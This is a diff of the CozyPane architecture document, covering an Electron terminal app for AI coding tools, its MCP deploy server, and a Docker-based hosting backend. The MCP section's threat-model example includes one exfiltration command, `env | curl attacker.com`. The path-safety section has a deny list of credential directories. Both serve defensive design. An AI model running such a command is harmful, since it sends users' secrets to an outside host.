@@ -1,327 +1,314 @@
-# CozyPane - Architecture & Roadmap
+# CozyPane Architecture
 
-## Vision
-A friendly, approachable terminal application designed for vibe coders who find raw terminals intimidating. Built specifically for AI CLI coding tools (Claude Code, Codex, Aider, etc.) while remaining a fully functional terminal. Shows users what AI tools are doing to their codebase in real time.
+This document describes the **current state** of the CozyPane codebase as of v0.7.x. For hands-on conventions (release flow, dev commands, keep-Monaco-mounted rules) see [CLAUDE.md](./CLAUDE.md).
 
-## Target Users
-Complete beginners who've never used a terminal but want to use AI coding tools.
-
-## Tech Stack Decisions
-
-### Electron over Tauri
-We evaluated both:
-- **Tauri** (Rust + OS webview): lighter (~15MB), less RAM, but younger ecosystem, webview inconsistencies across platforms, harder terminal emulation, Rust learning curve
-- **Electron** (Chromium + Node.js): heavier (~150MB), more RAM, but battle-tested ecosystem, xterm.js works perfectly, every hard problem already solved (PTY, file watching, diffs), used by VS Code/Cursor/Warp/Slack/Discord
-- **Decision:** Electron. Terminal emulation is the core feature, and xterm.js on Electron is rock-solid. The weight tradeoff doesn't matter for a desktop dev tool. Node.js is faster to develop with for filesystem/process/git work.
-
-### React over Vue/Svelte
-- Biggest ecosystem, most examples, Monaco is React-friendly, xterm.js has React wrappers, largest developer pool for contributors.
-
-### Monaco over CodeMirror
-- Since we want a full editor (not just preview), Monaco IS the VS Code editor. Users already know the UX. Heavier than CodeMirror but we're already paying the Electron tax. Free: syntax highlighting, autocomplete, minimap, find/replace.
-
-## Tech Stack
-- **Framework:** Electron (same as VS Code, Cursor, Warp)
-- **Frontend:** React + TypeScript
-- **Terminal:** xterm.js + node-pty (full PTY - bash/zsh/powershell)
-- **Editor:** Monaco (VS Code's editor component) - to be integrated
-- **Build:** Vite (renderer) + TypeScript compiler (main process)
-- **Platforms:** macOS + Windows + Linux
-
-## Project Structure
-```
-cozypane/
-├── src/
-│   ├── main/                  # Electron main process
-│   │   ├── main.ts            # App entry, window creation, lifecycle (~73 lines)
-│   │   ├── pty.ts             # PTY spawn, write, resize, CWD detection
-│   │   ├── filesystem.ts      # fs:readdir, readfile, writefile, homedir
-│   │   ├── watcher.ts         # File watcher with dedup/noise filtering
-│   │   └── preload.ts         # Bridge between main and renderer
-│   └── renderer/              # React frontend
-│       ├── App.tsx             # Root layout (terminal-first, panels right)
-│       ├── main.tsx            # React entry point + ErrorBoundary
-│       ├── types.d.ts          # TypeScript type definitions
-│       ├── components/
-│       │   ├── Sidebar.tsx     # File browser tree (receives watcher events via prop)
-│       │   ├── FilePreview.tsx # Monaco editor with save, dirty tracking
-│       │   ├── Terminal.tsx    # xterm.js + focus management
-│       │   ├── CommandInput.tsx # Warp-style editable input bar
-│       │   ├── StatusBar.tsx   # Bottom status bar with layout controls
-│       │   ├── ActivityFeed.tsx # Real-time file change log
-│       │   └── ErrorBoundary.tsx # React error boundary with reload
-│       ├── lib/
-│       │   └── terminalAnalyzer.ts # ANSI stripping, pattern matching, focus analysis
-│       └── styles/
-│           └── global.css      # All styles, CSS variables theming
-├── audits/                     # Code audit reports
-├── scripts/
-│   └── dev.mjs                # Dev script (Vite + Electron launcher)
-├── package.json
-├── tsconfig.json               # Renderer TypeScript config
-├── tsconfig.main.json          # Main process TypeScript config
-└── vite.config.ts
-```
-
-## Layout — Terminal First
-
-The terminal is the hero. File browser and preview are secondary panels on the right.
-
-### Mode 1: Two-Column (stacked right panel)
-```
-┌──────────────────────────────┬─────────────┐
-│                              │  Files      │
-│                              │  > src/     │
-│         TERMINAL             │  > lib/     │
-│       (full height)          ├─────────────┤
-│                              │  Preview    │
-│                              │  [file      │
-│  ┌─────────────────────────┐ │   content]  │
-│  │ $ command input bar     │ │             │
-│  └─────────────────────────┘ │             │
-├──────────────────────────────┴─────────────┤
-│ Status Bar                    Hide | Split  │
-└─────────────────────────────────────────────┘
-```
-
-### Mode 2: Three-Column (side by side)
-```
-┌──────────────────┬──────────┬───────────┐
-│                  │  Files   │  Preview  │
-│    TERMINAL      │  > src/  │  [file    │
-│   (full height)  │  > lib/  │   content]│
-│                  │  app.ts  │           │
-│  ┌─────────────┐│          │           │
-│  │ $ input bar ││          │           │
-│  └─────────────┘│          │           │
-├──────────────────┴──────────┴───────────┤
-│ Status Bar                               │
-└──────────────────────────────────────────┘
-```
-
-Toggle between modes via status bar buttons. "Hide Panels" collapses right side for full-width terminal.
+Historical note: an earlier version of this file contained a Phase 1–7 roadmap from the pre-cloud era. That roadmap has been removed — every phase it described has either shipped or been deliberately cut. This doc is now an as-built description of what exists today.
 
 ---
 
-## Feature Roadmap
+## Product shape
 
-### Phase 1 - Foundation [DONE]
-- [x] Electron + React + TypeScript project setup
-- [x] Full PTY terminal (bash/zsh/powershell) via xterm.js + node-pty
-- [x] Collapsible sidebar with file browser (expandable folder tree)
-- [x] File preview with line numbers and tabs
-- [x] Resizable panels (drag handles for all splits)
-- [x] Dark theme (purple/cozy palette)
-- [x] Status bar with cwd and ready indicator
-- [x] Cross-platform PTY (detects shell per OS)
-- [x] Claude Code nesting fix (strips CLAUDECODE env var)
-- [x] Dynamic Vite port detection for dev mode
+CozyPane is two codebases that work together:
 
-### Phase 1.5 - Terminal-First Layout & Smart Input [DONE]
-- [x] Terminal-first layout (terminal left, panels right)
-- [x] Two layout modes (stacked / three-column) with toggle
-- [x] "Hide Panels" to collapse right side for full-width terminal
-- [x] **Warp-style command input bar** — real editable text field with:
-  - [x] Full mouse cursor positioning, text selection, copy/paste
-  - [x] Multi-line editing (Shift+Enter for newline)
-  - [x] Command history (Up/Down arrows)
-  - [x] Enter to submit, Ctrl+C to cancel/clear
-- [x] **Dual focus system** — command mode (input bar) + raw mode (terminal clicks):
-  - [x] Input bar: type full commands, send on Enter (for shell, Claude prompts, etc.)
-  - [x] Terminal click: raw keystrokes go to terminal (for menus, Y/n, password prompts)
-- [x] **Auto-detection** — automatically switches between modes:
-  - [x] Detects interactive menus ("Enter to confirm", "Y/n", numbered choices) → raw mode
-  - [x] Detects text prompts (shell `$`/`%`, Claude `❯`, REPL `>>>`) → input bar mode
-  - [x] Checks last 5 lines (not just last) to handle status bars below prompts
-  - [x] Manual override (click) pauses auto-detect for 5 seconds
-  - [x] Rolling output buffer (last 3000 chars) for reliable pattern matching
-- [x] **TUI app detection** — auto-passthrough for vim/nano/htop/less (alternate screen buffer)
-- [x] **Contextual slash commands** — autocomplete dropdown for Claude Code commands:
-  - [x] Only shows when Claude is detected as running
-  - [x] Tab/Arrow navigation, Enter to select
-  - [x] Hardcoded list (16 commands) — TODO: parse from Claude's /help output
-- [x] Focus indicator bar showing current mode
+1. **`cozypane/`** — an Electron desktop app: terminal + Claude-focused command UX + Monaco editor + Git panel + Deploy panel + webview Preview. The app uses the `cozypane_*` MCP tools to let Claude Code invoke deployment actions directly.
+2. **`cozypane-cloud/`** — a Fastify + PostgreSQL + Dockerode PaaS backend. Users upload a project tarball; the server detects the framework, generates a Dockerfile, builds the image, runs the container on a per-user Docker network, and exposes it at `<appname>-<user>.cozypane.com` via Traefik with custom-domain support and per-deployment Postgres provisioning.
 
-### Phase 2 - Full Editor [DONE]
-- [x] Monaco editor replaces read-only file preview
-- [x] Syntax highlighting for 30+ languages (auto-detected by extension)
-- [x] File editing and saving (Cmd/Ctrl+S writes to disk)
-- [x] Find/replace within files (Monaco built-in)
-- [x] Multiple tabs with unsaved indicators (● dot on dirty tabs)
-- [x] Minimap enabled
-- [x] CozyPane dark theme for Monaco (matching purple/cozy palette)
-- [x] Monaco web workers configured for JSON, CSS, HTML, TypeScript
-- [x] Bracket pair colorization and guides
-- [x] Sidebar follows terminal cwd (lsof-based PTY cwd detection)
-- [x] Three-column file browser narrower (180px) for more preview space
-- [x] `fs:writefile` IPC handler for saving files from renderer
-- [x] `terminal:getCwd` IPC handler — queries PTY process cwd via lsof on macOS, /proc on Linux
-
-### Phase 3 - AI Activity Tracking [DONE]
-- [x] File change detection via `fs.watch` (recursive, with dedup and noise filtering)
-- [x] Activity feed panel — real-time log of created/modified/deleted files with timestamps
-- [x] Highlight modified files in sidebar (color-coded: green=new, yellow=modified, red=deleted)
-- [x] Sidebar live updates — new/deleted files appear/disappear instantly from watcher events
-- [x] Panel tab bar — toggle between Editor, Activity, Chat, and Settings tabs
-- [x] Smart filtering — ignores Library/, .git/, node_modules/, .DS_Store, temp files, etc.
-- [x] Deduplication — macOS duplicate events suppressed (500ms window)
-- [x] Terminal scrollbar fix — thin styled scrollbar, no longer overlays content
-- [x] Diff viewer — Monaco diff editor, file snapshots with git fallback for originals
-- [x] Token usage / cost tracking — best-effort parsing of Claude Code output, shown in status bar
-- [x] Conversation history — tracks user inputs + assistant output, chat-like UI tab
-- [x] Safety indicators — green/yellow/red/blue/purple status dots for idle/reading/writing/executing/thinking
-- [x] Plain English summaries — user-configurable LLM API (Anthropic/OpenAI) with Settings tab
-- [x] Settings panel — provider/model/API key selection with OS-level encryption (safeStorage)
-
-### Phase 4 - Git Integration
-- [ ] Git status panel (branches, staged changes, commit history)
-- [ ] Visual diff viewer
-- [ ] One-click undo/revert of AI's last change
-- [ ] Commit from UI
-
-### Phase 5 - UX for Beginners
-- [ ] Guided mode - suggested next prompts ("Want to test these changes?", "Want to commit?")
-- [ ] File change toast notifications (popups when files created/modified/deleted)
-- [ ] Prompt templates/snippets ("fix all TypeScript errors", "add tests for this file")
-- [ ] Project templates ("Start a React app", "Start a Python API")
-- [ ] Drag & drop files into terminal to reference them in prompts
-- [ ] Dark/light themes with friendly theme options (not just "hacker green")
-- [ ] Dynamic slash command parsing from Claude's /help output
-
-### Phase 6 - Power Features
-- [ ] Split view - terminal on one side, file preview on other
-- [ ] Session history - browse past AI conversations and file changes
-- [ ] Multi-agent view - multiple Claude/AI instances side by side
-- [ ] Cost tracker dashboard - tokens/dollars per session with history
-
-### Phase 7 - Polish & Distribution
-- [ ] App icon and branding
-- [ ] Proper macOS title bar integration
-- [ ] Windows installer
-- [ ] macOS DMG packaging
-- [ ] Auto-updates
-- [ ] Onboarding flow for first-time users
+The two talk over HTTPS (`api.cozypane.com`) with JWT auth. A third, standalone process — the MCP server bundled inside the Electron app — also talks to the same cloud API when Claude Code invokes deploy tools.
 
 ---
 
-## Design Principles
-1. **Terminal first** — The terminal is the hero, everything else supports it
-2. **Cozy, not scary** — Warm colors, friendly UI, no intimidating terminal aesthetics
-3. **Transparent** — Always show what AI is doing, never hide actions
-4. **Safe** — Undo everything, confirm destructive actions, safety indicators
-5. **Smart defaults, manual override** — Auto-detect what mode to be in, but user can always override
-6. **Simple first** — Start minimal, add complexity only when needed
-7. **Works out of the box** — No configuration needed to get started
+## Desktop app (`cozypane/`)
 
-## Color Palette
-| Token              | Value     | Usage                |
-|--------------------|-----------|----------------------|
-| --bg-primary       | #1a1b2e   | Main background      |
-| --bg-secondary     | #232438   | Sidebar, panels      |
-| --bg-tertiary      | #2a2b42   | Nested panels        |
-| --bg-hover         | #333456   | Hover states         |
-| --bg-active        | #3d3e5c   | Active/selected      |
-| --text-primary     | #e4e4f0   | Main text            |
-| --text-secondary   | #9394a5   | Secondary text       |
-| --text-muted       | #6b6c7e   | Muted/disabled text  |
-| --accent           | #7c6ef0   | Purple accent        |
-| --accent-hover     | #9488f5   | Accent hover state   |
-| --accent-dim       | #4a3fb0   | Selection / raw mode |
-| --border           | #333456   | Border color         |
-| --success          | #5ce0a8   | Green - safe/reading |
-| --warning          | #f0c95c   | Yellow - writing     |
-| --danger           | #f06c7e   | Red - destructive    |
-| --info             | #5cb8f0   | Blue - informational |
+### Tech stack
 
-## Terminal Theme
-Custom xterm.js theme matching the CozyPane palette. Purple cursor (#7c6ef0), warm pastels for ANSI colors, matching background (#1a1b2e).
+- **Electron 33** (Chromium + Node)
+- **React 18** + **TypeScript** + **Vite**
+- **xterm.js** + **node-pty** for the terminal
+- **Monaco Editor** for file editing and diff viewing
+- **@modelcontextprotocol/sdk** for the MCP server
+- **electron-updater** for auto-updates via GitHub Releases
+- **electron-builder** for packaging (macOS DMG, Windows NSIS, Linux AppImage/deb/rpm)
 
-## Name Origin
-**CozyPane** = "cozy" (friendly, safe, warm) + "pane" (split panels UI). The app makes the terminal feel like a cozy, safe space rather than a scary black box.
+### Process boundaries
 
-## Key Implementation Details
+```
+┌──────────────────────────────────────────────────────────┐
+│  Electron main process (Node)                            │
+│  src/main/*.ts → compiled to dist/main/*.js (CommonJS)   │
+│                                                          │
+│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │
+│  │ pty.ts   │ │ git.ts   │ │ deploy.ts│ │preview.ts│     │
+│  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │
+│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │
+│  │filesystem│ │watcher.ts│ │settings  │ │update-   │     │
+│  │   .ts    │ │          │ │   .ts    │ │checker.ts│     │
+│  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │
+│           │ preload.ts bridges via contextBridge │       │
+└──────────────────────────┬───────────────────────────────┘
+                           │ window.cozyPane.*  (IPC)
+┌──────────────────────────▼───────────────────────────────┐
+│  Electron renderer process (Chromium, sandboxed)         │
+│  src/renderer/**/*.tsx → bundled by Vite                 │
+│                                                          │
+│  App.tsx ─┬─ Terminal.tsx (xterm.js)                     │
+│           ├─ CommandInput.tsx (warp-style bar)           │
+│           ├─ Sidebar.tsx (file tree)                     │
+│           ├─ FilePreview.tsx (Monaco editor)             │
+│           ├─ DiffViewer.tsx (Monaco diff)                │
+│           ├─ Preview.tsx (webview preview)               │
+│           ├─ GitPanel.tsx                                │
+│           ├─ DeployPanel.tsx                             │
+│           ├─ Settings.tsx                                │
+│           ├─ TerminalTabBar.tsx / TabLauncher.tsx        │
+│           ├─ CommandPalette.tsx (Cmd+K)                  │
+│           └─ UpdateBanner.tsx / ErrorBoundary.tsx        │
+└──────────────────────────────────────────────────────────┘
 
-### PTY Environment
-- Strips `CLAUDECODE` env var so Claude Code can run inside CozyPane without nesting errors
-- Sets `TERM=xterm-256color` and `COLORTERM=truecolor` for full color support
-- Detects OS shell automatically (zsh on macOS, powershell on Windows)
+┌──────────────────────────────────────────────────────────┐
+│  MCP server (standalone subprocess spawned by Claude)    │
+│  src/main/mcp-server.ts → bundled by esbuild             │
+│                                                          │
+│  Exposes: cozypane_deploy, cozypane_list_deployments,    │
+│  cozypane_get_deployment, cozypane_get_logs,             │
+│  cozypane_delete_deployment, cozypane_redeploy,          │
+│  cozypane_get_preview_info                               │
+│                                                          │
+│  Reads credentials via the MCP config file's `env`       │
+│  block (written by main process, mode 0600). Calls the   │
+│  same REST API as the desktop app.                       │
+└──────────────────────────────────────────────────────────┘
+```
 
-### IPC Architecture
-Main process exposes APIs via preload script (`window.cozyPane`):
-- `terminal.*` - PTY create, write, resize, onData, onExit, getCwd
-- `fs.*` - readdir, readfile, writefile, homedir
-- `watcher.*` - start, stop, onChange
+Security invariants enforced by the BrowserWindow config:
+- `contextIsolation: true`
+- `nodeIntegration: false`
+- `sandbox: true`
+- `webviewTag: true` (required for the Preview panel) — hardened via `app.on('web-contents-created')` which strips `preload`/`nodeIntegration`/`webSecurity=false` from attaching `<webview>` elements and blocks navigation to non-http(s) protocols.
 
-All communication is through Electron's contextBridge with contextIsolation + sandbox enabled (secure). IPC handlers are split across modules (pty.ts, filesystem.ts, watcher.ts) registered at startup.
+### Key files
 
-### Monaco Editor
-- Replaces the read-only FilePreview with a full VS Code editor
-- Workers loaded via Vite's `?worker` import syntax (static imports required)
-- Custom `cozy-dark` theme matching the CozyPane palette
-- Language auto-detected from file extension (30+ languages mapped)
-- Cmd/Ctrl+S saves via `fs:writefile` IPC handler
-- Dirty state tracked via `model.getAlternativeVersionId()` (O(1), no full content comparison)
-- Container div always stays mounted (loading/error render as overlays) to prevent Monaco destruction
+**Main process (`cozypane/src/main/`):**
 
-### CWD Tracking
-- Sidebar file browser follows the terminal's current working directory
-- Uses `lsof -a -p PID -d cwd -Fn` on macOS, `/proc/PID/cwd` on Linux
-- Finds child processes of the PTY via `ps` to get the actual shell PID
-- Polled on output idle (400ms) and 500ms after each command submission
-- Sidebar reloads file tree whenever cwd changes
+| File | Purpose |
+|---|---|
+| `main.ts` | App entry, window lifecycle, menu, global error handlers, webview hardener, auto-update wiring |
+| `preload.ts` | `contextBridge` — exposes `window.cozyPane.{terminal,fs,watcher,settings,deploy,preview,updates,git,mcp}` |
+| `pty.ts` | node-pty spawn + IPC handlers, CWD detection via macOS `lsof` / Linux `/proc` |
+| `filesystem.ts` | `fs:*` IPC handlers guarded by `assertSafePath` |
+| `watcher.ts` | Recursive `fs.watch` with dedup + noise filter + bounded git-show concurrency for diff snapshots |
+| `settings.ts` | `safeStorage`-encrypted API keys; `callLlm()` currently used only by Git commit-msg generator |
+| `git.ts` | Git ops via `execFile` with timeouts; `addRemote` URL allowlist blocks `ext::`/`file://` transports |
+| `deploy.ts` | Deploy IPC client (OAuth flow, token storage, domain CRUD, list/logs/delete/redeploy) |
+| `deploy-shared.ts` | `apiFetch` + `createTarball` — shared between `deploy.ts` and `mcp-server.ts` |
+| `preview.ts` | Built-in static HTTP server with path-traversal guard; dev-command detection per framework |
+| `crypto.ts` | `safeStorage` wrappers; refuses persistence on systems without real keyring |
+| `slash-commands.ts` | Dynamic slash-command loader (resolves the `claude` binary + filesystem scan; cached by mtime) |
+| `update-checker.ts` | electron-updater + separate Homebrew/claude-cli version watcher |
+| `mcp-server.ts` | Standalone MCP server, bundled via esbuild to run as a separate process |
 
-### Smart Input System (Warp-style)
-The command input bar is always visible at the bottom of the terminal. Two focus modes:
+**Renderer (`cozypane/src/renderer/`):**
 
-1. **Command mode** (input bar focused): User types in the editable input bar. Full mouse support, text selection, multi-line. Enter sends to PTY.
-2. **Raw mode** (terminal focused): Keystrokes go directly to PTY. For interactive menus, Y/n prompts, password entries.
+| Path | Purpose |
+|---|---|
+| `App.tsx` | Layout, state, keyboard shortcuts, ref-mirrored cross-component state |
+| `components/*.tsx` | 15 UI components — see list in the diagram above |
+| `lib/terminalAnalyzer.ts` | ANSI strip, focus-mode detection, Claude-running detection |
+| `lib/languageMap.ts` | file extension → Monaco language id |
+| `lib/monacoThemes.ts` | Cozy Dark / Ocean / Forest / Cozy Light theme registration (shared by FilePreview + DiffViewer) |
+| `lib/cozyMode.ts` | CLAUDE.md managed-block marker handling |
+| `lib/shellUtils.ts` | Shell-escape helpers for Git panel commands |
+| `styles/global.css` | Single CSS file with CSS-variable themes |
+| `types.d.ts` | `CozyPaneAPI` + supporting types; mirrors `preload.ts` surface |
 
-**Auto-detection** analyzes terminal output when it settles (400ms idle):
-- Checks recent output against interactive patterns (menus, confirmations) → switches to raw
-- Checks last 5 lines for text prompt patterns (shell, Claude, REPL) → switches to input bar
-- Manual click overrides auto-detection for 5 seconds
-- TUI apps (vim, nano, htop) detected via alternate screen buffer → full passthrough
+### Main ↔ renderer contract
 
-**Slash commands** show as autocomplete dropdown when typing `/` inside Claude Code:
-- Currently hardcoded list of 16 standard Claude Code commands
-- Only visible when Claude is detected as the active process
-- TODO: Parse dynamically from Claude's `/help` output
+All IPC goes through `preload.ts`. The renderer never imports Node APIs directly. The preload surface is namespaced: `window.cozyPane.terminal`, `window.cozyPane.fs`, `.git`, `.deploy`, `.preview`, `.watcher`, `.settings`, `.updates`, `.mcp`. Types live in `src/renderer/types.d.ts`.
 
-### Output Analysis (ANSI Stripping)
-Terminal output contains heavy ANSI escape sequences. The `stripAnsi()` function removes:
-- CSI sequences: `\x1b[...m` (colors, cursor movement)
-- OSC sequences: `\x1b]...BEL` (title, hyperlinks)
-- Other escape sequences and control characters
-A rolling buffer of 3000 chars is maintained for pattern matching.
+Error surfacing is best-effort — most handlers return `{ success?: boolean, error?: string }` shapes. The renderer is expected to check `result.error` before using the result. Central IPC error normalization is a future improvement.
 
-### Dev Workflow
-1. `npm install` then `npx electron-rebuild -f -w node-pty`
-2. `node scripts/dev.mjs` starts Vite + Electron with hot reload
-3. Dev script auto-detects Vite's port and passes to Electron via `VITE_DEV_PORT` env var
+### Path safety policy
 
-### Sidebar File Browser
-- Immutable state updates (updateNode pattern) for React compatibility
-- Lazy loading: only fetches directory contents on expand
-- Hidden files filtered (except .env)
-- Sorted: directories first, then alphabetical
+All `fs:*` handlers in `filesystem.ts` call `assertSafePath()` on every user-supplied path. The fence is based on an allowlist of opened project roots that the main process tracks — entries are added when the user picks a directory via `fs:pickDirectory` or when a terminal's cwd updates. `~/.ssh`, `~/.aws`, `~/.config/cozypane/*`, and similar sensitive dotdirs are always denied.
 
-### Agreed Feature Details (from initial discussion)
+The same allowlist gates `watcher:start` and `watcher:getDiff`, so a compromised renderer cannot use the watcher as a side-channel to enumerate or read files outside the opened projects.
 
-**All 11 proposed features approved for implementation:**
-1. Git integration panel (Phase 4)
-2. Diff viewer (Phase 3/4)
-3. Undo button for AI changes (Phase 4)
-4. Project templates (Phase 5)
-5. Session history (Phase 6)
-6. Split view (Phase 6)
-7. Dark/light themes (Phase 5)
-8. Drag & drop files to terminal (Phase 5)
-9. Prompt templates/snippets (Phase 5)
-10. Cost tracker (Phase 6)
-11. Multi-agent view (Phase 6)
+### MCP integration
 
-**All 4 "Vibe Coder Safety" features approved:**
-1. Safety net indicators - green/yellow/red for read/write/execute (Phase 3)
-2. Plain English summaries after AI finishes (Phase 3)
-3. Guided mode - suggested next prompts (Phase 5)
-4. File change toast notifications (Phase 5)
+CozyPane ships a standalone MCP server that runs as a subprocess of Claude Code (not of the Electron main process). Workflow:
+
+1. The user opens or creates a "cozy mode" project — the main process writes a managed block to `CLAUDE.md` and ensures an MCP config file exists at `<userData>/cozypane-mcp.json` (mode 0600).
+2. The MCP config file lists a single server whose `command` points at the bundled `dist/main/mcp-server.js` (extracted from the Electron asar to a real path on first launch). The `env` block of this file contains `COZYPANE_DEPLOY_TOKEN` and `COZYPANE_GH_TOKEN` — they are **not** exported into the PTY environment.
+3. When the user types `cozydeploy <cwd>` (or `claude --mcp-config <path>` is invoked), Claude Code reads the MCP config file, spawns the MCP server subprocess with that env, and the MCP server can then call the cloud API with the deploy token.
+4. The MCP server exposes the seven `cozypane_*` tools, all of which delegate to `deploy-shared.apiFetch`.
+
+This means the MCP server is the **only** process in the user's session that sees the deploy/GitHub tokens. A shell running `env | curl attacker.com` from any PTY tab gets nothing.
+
+### Release flow
+
+Release is fully automated via GitHub Actions:
+
+1. Bump `package.json` version
+2. `git commit && git tag vX.Y.Z && git push origin main --tags`
+3. `.github/workflows/release.yml` builds macOS (signed + notarized via Apple notarytool), Windows, Linux and publishes to GitHub Releases
+4. electron-updater on users' machines picks up the new release
+
+Do not build locally. Do not upload artifacts manually. The old Cloudflare Worker + R2 download pipeline (`workers/downloads/` + `scripts/release.sh`) has been deleted.
+
+---
+
+## Cloud backend (`cozypane-cloud/`)
+
+### Tech stack
+
+- **Fastify 5** (HTTP + WebSocket)
+- **PostgreSQL 16** via `pg`
+- **Dockerode** to drive the Docker daemon on the host
+- **Traefik** reverse proxy with Cloudflare DNS challenge for wildcard TLS
+- **jsonwebtoken** for user + admin JWT auth (GitHub OAuth)
+- **docker-compose** for multi-service orchestration (`api`, `traefik`, `postgres`)
+
+### Shape
+
+```
+cozypane-cloud/src/
+├── index.ts              # Fastify app entry
+│                         # - cors, rate-limit, multipart, websocket, static
+│                         # - setErrorHandler: sanitized 5xx / passthrough 4xx
+│                         # - unhandledRejection / uncaughtException handlers
+│                         # - startup reconcile: flip stuck 'building' rows
+│
+├── routes/
+│   ├── health.ts         # GET /health
+│   ├── auth.ts           # GitHub OAuth, JWT, cookie transport
+│   ├── deploy.ts         # POST /deploy, lifecycle, logs stream, exec, domains
+│   └── admin.ts          # users, deployments, stats (admin-gated)
+│
+├── services/
+│   ├── detector.ts       # analyze tarball → framework/port/deps/tier
+│   ├── builder.ts        # generate Dockerfile + docker build
+│   ├── container.ts      # run, stop, restart, logs, exec, network mgmt
+│   ├── database.ts       # per-deployment Postgres provisioning
+│   └── cleanup.ts        # shared deployment teardown sequence
+│
+├── middleware/
+│   ├── auth.ts           # user JWT verification
+│   └── adminAuth.ts      # admin JWT + is_admin flag check
+│
+├── db/
+│   ├── index.ts          # pg.Pool + platformPool singletons
+│   └── schema.sql        # users, deployments, domains, databases, builds
+│
+└── admin/public/         # admin SPA (static HTML + vanilla JS)
+```
+
+### Deployment lifecycle
+
+```
+POST /deploy (multipart)
+  → validate app name, enforce per-user rate limit (5/min)
+  → extract tarball into a tempdir with tar-fs path-traversal filter
+  → analyzeProject(extractDir)  — detect framework, port, Dockerfile, DB deps
+  → INSERT deployment row status='building', return immediately
+  → fire-and-forget buildAndDeploy()  (background worker)
+       ├─ phase: building
+       │    └─ buildImage(extractDir) → docker build → image tag
+       ├─ phase: provisioning_db (if detector said needsDatabase)
+       │    └─ provisionDatabase(userId, appName) → postgres role + db
+       ├─ phase: starting
+       │    └─ runContainer(imageTag, config, userId)
+       │          - tier-based memory/CPU limits
+       │          - cap drop ALL + no-new-privileges + tmpfs /tmp + PidsLimit
+       │          - attach to traefik-public + cp-user-<id> networks
+       │          - Traefik labels for routing
+       ├─ phase: health_check
+       │    └─ waitForHealthy(containerId, port, 120s)
+       │          - success → status='running', regenerate Traefik file configs
+       │                       for any verified custom domains
+       │          - fail    → status='unhealthy', classify error, schedule
+       │                       background re-check
+       └─ any phase error → error_detail populated via makeErrorDetail(phase,
+                            code, message, suggestion, logs)
+```
+
+Deploy uploads max 100 MB (Fastify multipart limit). Per-user deployment cap: 10 (hardcoded in `routes/deploy.ts`; move to a tier/plan config is future work).
+
+Deletion goes through `services/cleanup.ts` which runs `stopContainer → dropDatabase → removeImage → removeNetworkIfEmpty` with warning accumulation. This is the single source of truth for the four delete handlers (user single, user group, admin per-user, admin per-deployment).
+
+### Custom domains
+
+`domains` table is keyed by `deployment_id` + `domain` (globally unique). Verification uses CNAME and A-record matching:
+
+1. Resolve CNAME for the customer domain. Match → verified.
+2. Else resolve A for both the customer domain and the cozypane subdomain. Match → verified.
+3. Else return `dnsError` describing what to configure.
+
+The previous "any HTTP response = verified" HTTP fallback was removed (it allowed domain squatting). Users behind Cloudflare's proxy that flattens CNAMEs to the proxy's A records currently need to use unproxied DNS until a challenge-token verifier is added.
+
+On verification, the server writes a Traefik file-provider YAML into the shared `traefik-dynamic` volume. Traefik watches that directory and picks up changes without a restart.
+
+### Authentication
+
+**User flow:** GitHub OAuth → `POST /auth/github` exchanges the code for a GitHub token → upsert user row → issue cozypane JWT. The GitHub token is encrypted with a server-side key (`GITHUB_TOKEN_ENCRYPTION_KEY`) and stored in `users.access_token`; it is not returned in the response body. Desktop clients fetch it via `GET /auth/github-token` when needed.
+
+**Admin flow:** A separate `ADMIN_GITHUB_CLIENT_ID` OAuth app. `GET /auth/admin-callback` exchanges the code and sets an `admin_session` HttpOnly + Secure + SameSite=Lax cookie rather than redirecting with the JWT in the URL fragment. The admin SPA reads identity from `GET /auth/me` using the cookie.
+
+Admin routes are gated by `middleware/adminAuth.ts` which checks `is_admin = TRUE` on the user row after JWT verification.
+
+### Infrastructure
+
+`docker-compose.yml` defines three services:
+- **traefik** — reverse proxy, Cloudflare DNS challenge for wildcard cert, file provider for custom domains. Dashboard is disabled in production (no wildcard catch-all router, no `--api.insecure`). Enable only behind BasicAuth middleware if debugging.
+- **api** — the Fastify app, with the Docker socket mounted read-write (required to build/run tenant containers).
+- **postgres** — v16-alpine, shared Postgres instance. Tenant databases are created inside this instance via `services/database.ts`.
+
+Volumes: `traefik-certs` (LetsEncrypt), `traefik-dynamic` (shared with api for file-provider writes), `pgdata`.
+
+---
+
+## Cross-codebase contracts
+
+The two codebases share no compile-time code. The desktop app's `renderer/types.d.ts` declares a `Deployment` interface that mirrors the cloud API's response shape by hand — drift is tracked manually. Future work: a shared `packages/contracts/` workspace with both sides depending on it.
+
+`deploy-shared.ts` (desktop main) defines `APP_NAME_REGEX`; the cloud re-declares the same regex in `routes/deploy.ts`. They must stay in sync — a unit test or shared import is future work.
+
+Framework detection exists in two places:
+- `cozypane/src/main/preview.ts` — chooses a local dev command (angular/vite/cra/svelte/...)
+- `cozypane-cloud/src/services/detector.ts` — chooses a build Dockerfile template (express/fastify/hono/nestjs/...)
+
+The two framework lists overlap but aren't identical. When adding a new framework, update both.
+
+---
+
+## Design principles (in force)
+
+1. **Terminal first** — every other panel supports the terminal, not the other way around.
+2. **Transparent** — show what AI is doing (file tree colors, diff viewer, preview webview console).
+3. **Smart defaults, manual override** — auto-detect focus mode, but user always overrides.
+4. **Simple first** — start minimal; add complexity only when needed.
+5. **Works out of the box** — no configuration required to get started.
+6. **Cozy, not scary** — warm colors, friendly UI, no black-box terminal.
+7. **Safe** — confirm destructive actions (delete file, delete deployment, Cmd+W with dirty files).
+
+---
+
+## What is **not** here
+
+These are intentional non-goals of the current codebase:
+
+- A plugin/extension system for third-party UI contributions
+- Remote desktop-app features (CozyPane is local-only; cloud backend is a separate concern)
+- Per-tab isolated watchers (today's watcher is a single-global)
+- A job queue for builds (buildAndDeploy is fire-and-forget)
+- Rollback to a previous deployment image (listed in TODO.md)
+- Auto-scaling containers
+- GitOps push-to-deploy
+- MySQL/Redis (only PostgreSQL is provisioned today)
+
+---
+
+## Related docs
+
+- `CLAUDE.md` — dev conventions, release process, hard rules (Monaco mount, worker imports)
+- `README.md` — user-facing pitch and feature list
+- `cozypane-cloud/TODO.md` — cloud backend roadmap items
+- `audits/` — historical + current code audit reports
